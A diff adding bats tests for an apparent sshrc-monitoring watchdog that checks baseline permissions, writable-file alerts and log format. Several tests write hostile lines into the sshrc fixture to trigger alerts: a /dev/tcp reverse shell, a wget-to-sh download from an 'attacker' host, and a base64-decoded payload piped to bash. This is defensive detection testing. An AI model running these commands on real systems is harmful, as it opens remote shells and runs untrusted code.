@@ -118,3 +118,60 @@ seed_benign() {
     [ "${status}" -ne 0 ]
     cap | grep -q '"severity":"alert"'
 }
+
+@test "baseline is chmod 0600 (confidentiality — sshrc inventory enumerates per-SSH-login exec surface)" {
+    seed_benign
+    run_wd
+    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
+}
+
+@test "INVARIANT (reverse-shell pattern): /dev/tcp reverse shell in sshrc → alert" {
+    seed_benign
+    run_wd
+    printf '# sshrc\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${SSHRC}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (wget-pipe-sh): wget bootstrap variant in sshrc → alert" {
+    seed_benign
+    run_wd
+    printf '# sshrc\nwget -qO- http://attacker/p | sh\n' > "${SSHRC}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (base64-decode-pipe): obfuscation variant in sshrc → alert" {
+    seed_benign
+    run_wd
+    printf '# sshrc\necho YmFzaCAtaQ== | base64 -d | bash\n' > "${SSHRC}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (group-writable sshrc): group-writable → alert above world-writable bar" {
+    seed_benign
+    run_wd
+    chmod 0664 "${SSHRC}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
+
+@test "INVARIANT (pre-existing world-writable sshrc): baseline_initial fires alert at install-time" {
+    seed_benign
+    chmod 0666 "${SSHRC}"
+    run_wd
+    cap | grep -q '"event":"baseline_initial"'
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
+
+@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
+    seed_benign
+    run_wd
+    main_count=$(cap | grep -cE '^-t selfdef-sshrc -- ')
+    [ "${main_count}" = "1" ]
+}
